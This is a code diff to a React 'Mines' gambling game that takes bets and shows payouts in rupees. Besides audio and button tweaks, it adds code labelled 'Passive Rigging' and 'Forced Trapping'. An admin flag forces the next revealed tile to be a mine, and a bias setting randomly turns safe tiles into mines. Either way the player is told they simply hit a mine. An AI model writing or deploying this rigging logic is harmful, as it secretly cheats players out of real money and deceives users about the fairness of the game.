@@ -14,18 +14,32 @@ const MinesGame = ({ onBet, onWin, onLoss, isMuted, settings }) => {
     const houseEdge = (settings?.houseEdge || 1) / 100;
     const probabilityBias = (settings?.minesProbBias || 0) / 100;
 
-    const sounds = {
-        click: 'https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3',
-        win: 'https://assets.mixkit.co/active_storage/sfx/2013/2013-preview.mp3',
-        loss: 'https://assets.mixkit.co/active_storage/sfx/2018/2018-preview.mp3',
-        reveal: 'https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3'
-    };
+    // Pre-load sounds for instant playback
+    const [audioObjects] = useState({
+        click: new Audio('https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3'),
+        win: new Audio('https://assets.mixkit.co/active_storage/sfx/2013/2013-preview.mp3'),
+        loss: new Audio('https://assets.mixkit.co/active_storage/sfx/2018/2018-preview.mp3'),
+        reveal: new Audio('https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3'),
+        gem: new Audio('https://assets.mixkit.co/active_storage/sfx/600/600-preview.mp3') // Satisfying chime sound
+    });
 
     const playSound = (type) => {
         if (isMuted) return;
-        const audio = new Audio(sounds[type]);
-        audio.volume = 0.5;
-        audio.play().catch(() => { });
+        try {
+            const sound = audioObjects[type];
+            if (sound) {
+                sound.currentTime = 0;
+                sound.volume = 0.5;
+                sound.play().catch(() => {
+                    // Fallback for browsers that block auto-play or if URL fails
+                    const tempAudio = new Audio(sound.src);
+                    tempAudio.volume = 0.5;
+                    tempAudio.play().catch(() => { });
+                });
+            }
+        } catch (e) {
+            console.error("Audio play error", e);
+        }
     };
 
     // Calculate multiplier based on revealed tiles and mines
@@ -67,19 +81,49 @@ const MinesGame = ({ onBet, onWin, onLoss, isMuted, settings }) => {
     const revealTile = (index) => {
         if (gameState !== 'playing' || revealed.includes(index)) return;
 
+        // --- Precision Control & Difficulty Bias ---
+        let finalIsMine = mines.includes(index);
+
+        // 1. Forced Trapping (Manual Admin Control)
+        if (settings?.trapNextMine) {
+            finalIsMine = true;
+            if (!mines.includes(index)) {
+                setMines(prev => [...prev, index]);
+            }
+            // Reset trap after one use
+            import('../../firebase').then(({ db }) => {
+                import('firebase/firestore').then(({ doc, updateDoc }) => {
+                    updateDoc(doc(db, 'settings', 'casino'), { trapNextMine: false });
+                });
+            });
+        }
+        // 2. Probability Bias (Passive Rigging)
+        else if (settings?.minesProbBias > 0) {
+            const rigChance = settings.minesProbBias / 100;
+            if (Math.random() < rigChance) {
+                finalIsMine = true;
+                if (!mines.includes(index)) {
+                    setMines(prev => [...prev, index]);
+                }
+            }
+        }
+
         const newRevealed = [...revealed, index];
         setRevealed(newRevealed);
 
-        if (mines.includes(index)) {
+        if (finalIsMine) {
             setGameState('over');
             setPayout(0);
             onLoss(betAmount);
             playSound('loss');
             toast.error('KABOOM! You hit a mine.', { icon: '💥' });
         } else {
+            // Trigger sound immediately for each tile
             playSound('reveal');
+
             const multiplier = calculateMultiplier(newRevealed.length);
             setPayout((betAmount * multiplier).toFixed(2));
+
             if (newRevealed.length === 25 - mineCount) {
                 cashOut(newRevealed);
             }
@@ -143,7 +187,10 @@ const MinesGame = ({ onBet, onWin, onLoss, isMuted, settings }) => {
 
                 <div className="mt-2">
                     {gameState === 'playing' ? (
-                        <button onClick={() => cashOut()} className="w-full py-3.5 bg-[#00e701] hover:bg-[#2fff30] text-black rounded-[4px] font-black text-[15px] shadow-[0_4px_0_rgb(0,180,1)] active:translate-y-0.5 active:shadow-none transition-all">Cashout</button>
+                        <button onClick={() => cashOut()} className="w-full py-3.5 bg-[#00e701] hover:bg-[#2fff30] text-black rounded-[4px] font-black text-[15px] shadow-[0_4px_0_rgb(0,180,1)] active:translate-y-0.5 active:shadow-none transition-all flex flex-col items-center leading-none gap-0.5">
+                            <span className="text-[13px]">Cashout</span>
+                            {revealed.length > 0 && <span className="text-[11px] opacity-70">₹{payout}</span>}
+                        </button>
                     ) : (
                         <button onClick={startGame} className="w-full py-3.5 bg-[#00e701] hover:bg-[#2fff30] text-black rounded-[4px] font-black text-[15px] shadow-[0_4px_0_rgb(0,180,1)] active:translate-y-0.5 active:shadow-none transition-all">Bet</button>
                     )}
@@ -191,7 +238,7 @@ const MinesGame = ({ onBet, onWin, onLoss, isMuted, settings }) => {
                 </div>
 
                 <AnimatePresence>
-                    {gameState === 'playing' && revealed.length > 0 && (
+                    {gameState === 'over' && payout > 0 && (
                         <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.9 }} className="absolute z-20 pointer-events-none">
                             <div className="bg-[#0f212e]/95 border-[4px] border-[#00e701] rounded-[16px] w-[200px] aspect-square flex flex-col items-center justify-center shadow-[0_0_50px_rgba(0,0,0,0.5)] backdrop-blur-md">
                                 <div className="text-[#00e701] text-[34px] font-black tracking-tight leading-none mb-4">{currentMultiplier}x</div>
